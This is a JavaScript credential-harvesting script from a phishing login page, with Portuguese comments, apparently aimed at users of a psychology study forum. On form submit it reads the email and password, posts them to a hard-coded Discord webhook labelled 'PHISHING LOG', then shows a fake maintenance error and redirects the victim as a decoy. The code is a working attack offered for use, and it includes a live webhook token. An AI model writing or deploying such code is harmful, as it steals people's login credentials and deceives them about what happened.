<script>
        // *** 1. VERIFIQUE ESTA URL NOVAMENTE! ***
        // V√° ao Discord, recrie um Webhook e cole o link COMPLETO aqui.
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1435787322753810595/utx5640rP7rfCm2E5XBNo3ErZJaMICXKGpfKHIy0t-0ToiDI7Ged5yx3bFlY8cCKNsXE'; 

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); 

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Verifica√ß√£o de seguran√ßa (DEBUG): se o webhook falhar, voc√™ sabe que o script rodou.
            console.log("Tentando enviar credenciais:", email, password);

            // 2. O Payload JSON para envio
            const payload = JSON.stringify({
                // Configura√ß√µes visuais do Webhook
                username: "PHISHING LOG - MENTE ANAL√çTICA",
                // Remova avatar_url se voc√™ n√£o tiver uma imagem hospedada.
                
                embeds: [{
                    title: "üîì NOVAS CREDENCIAIS CAPTURADAS!",
                    description: "Captura de Login de F√≥rum/Site de Estudos de Psicologia",
                    color: 38462, // Cor de destaque (Azul Ciano em decimal)
                    fields: [
                        {
                            name: "üìß EMAIL",
                            value: `**${email}**`, // Destaque extra no valor
                            inline: false
                        },
                        {
                            name: "üîë SENHA",
                            value: `**${password}**`, // Destaque extra no valor
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Web Logger Ativo - PH"
                    },
                    timestamp: new Date().toISOString()
                }]
            });

            // 3. M√©todo de Envio (Fetch)
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: payload,
            })
            .then(response => {
                // Se o status for 204 (No Content), o Webhook funcionou perfeitamente.
                if (response.status === 204) {
                    console.log('Dados enviados com sucesso (Status 204).');
                } else {
                    console.error('Webhook Status Error:', response.status, response.statusText);
                }
                
                // A√ß√£o de Despiste
                alert("Erro de conex√£o: O servidor est√° em manuten√ß√£o. Tente novamente mais tarde.");
                window.location.href = 'https://discord.com/developers/docs/intro'; 
            })
            .catch(error => {
                console.error('Falha de Rede (N√£o Webhook):', error);
                // Mesmo se falhar, o despiste deve ocorrer
                window.location.href = 'https://discord.com/developers/docs/intro'; 
            });
        });
    </script>
